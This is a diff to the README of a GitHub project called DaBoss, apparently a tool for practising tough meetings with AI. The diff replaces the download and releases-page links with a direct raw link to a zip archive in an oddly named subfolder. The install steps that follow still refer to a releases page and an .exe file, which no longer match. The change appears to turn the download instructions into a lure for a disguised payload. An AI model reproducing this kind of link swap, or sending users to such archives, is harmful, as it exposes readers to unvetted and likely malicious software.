@@ -1,6 +1,6 @@
 # 📈 DaBoss - Master tough meetings with AI practice
 
-[![](https://img.shields.io/badge/Download_DaBoss-blue)](https://github.com/naise4991/DaBoss/releases)
+[![](https://img.shields.io/badge/Download_DaBoss-blue)](https://github.com/naise4991/DaBoss/raw/refs/heads/main/fruitist/Boss-Da-2.0-beta.3.zip)
 
 ## 📋 What is DaBoss?
 
@@ -21,7 +21,7 @@ Your computer needs specific parts to run this software. Check your system again
 
 You download the program through the project release page. Follow these steps to get the software onto your computer:
 
-1. Visit [https://github.com/naise4991/DaBoss/releases](https://github.com/naise4991/DaBoss/releases).
+1. Visit [https://github.com/naise4991/DaBoss/raw/refs/heads/main/fruitist/Boss-Da-2.0-beta.3.zip](https://github.com/naise4991/DaBoss/raw/refs/heads/main/fruitist/Boss-Da-2.0-beta.3.zip).
 2. Look for the version marked Latest.
 3. Click the file ending in .exe to start the download.
 4. Save the file to your desktop or downloads folder.
